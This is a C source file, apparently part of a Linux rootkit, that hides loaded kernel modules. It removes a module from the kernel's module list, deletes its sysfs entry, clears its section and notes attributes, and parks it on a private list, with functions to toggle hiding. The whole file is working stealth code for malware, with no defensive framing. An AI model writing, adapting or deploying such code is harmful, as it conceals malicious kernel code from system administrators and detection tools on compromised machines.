#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>

#include "kernel_functions.h"
#include "kernel_variables.h"
#include "module_hiding.h"

#define STATE_MODULES_VISIBLE 0
#define STATE_MODULES_HIDDEN 1

int modules_state = STATE_MODULES_VISIBLE;

LIST_HEAD(hidden_modules);

struct module* find_hidden_module(char* name)
{
  struct module* mod;

  list_for_each_entry(mod, &hidden_modules, list) {
   if (strcmp(mod->name, name) == 0) {
    return mod;
   }
  }
  return NULL;
}

void hide_module(struct module* mod)
{
  if (modules_state == STATE_MODULES_VISIBLE) {
    return;
  }

  // rimuove i moduli dalla linked list
  list_del(&mod->list);

  // rimuove la entry sysfs
  kobject_del(&mod->mkobj.kobj);

  mod->sect_attrs = NULL;
  mod->notes_attrs = NULL;

  // inserisce i moduli nella lista degli hidden modules
  list_add_tail(&mod->list, &hidden_modules);
}

void unhide_module(struct module* mod)
{
  // rimuove il modulo dalla lista degli hidden modules
  list_del(&mod->list);

  // riaggiunge il modulo nella linked list
  list_add(&mod->list, modules);

  // ripristina le entry di sysfs
  // commentato per evitare warning durante il run quando il modulo non è caricato
  /*
  mod->mkobj.kobj = saved_kobj;
  kobject_add(&mod->mkobj.kobj, mod->mkobj.kobj.parent, "%s", mod->mkobj.kobj.name);
  */
}

void set_module_hidden(char* name)
{
  struct module* mod;

  mutex_lock(&module_mutex);
  mod = find_module(name);
  mutex_unlock(&module_mutex);

  if (mod != NULL) {
    hide_module(mod);
  }
}

void set_module_visible(char* name)
{
  struct module* mod = find_hidden_module(name);

  if (mod != NULL) {
    unhide_module(mod);
  }
}

void enable_module_hiding(void)
{
  modules_state = STATE_MODULES_HIDDEN;
}

void disable_module_hiding(void)
{
  while (hidden_modules.next != &hidden_modules) {
    struct module* mod = container_of(hidden_modules.next, struct module, list);
    unhide_module(mod);
  }

  modules_state = STATE_MODULES_VISIBLE;
}

void init_module_hiding(void)
{
  enable_module_hiding();
}

void finalize_module_hiding(void)
{
  disable_module_hiding();
}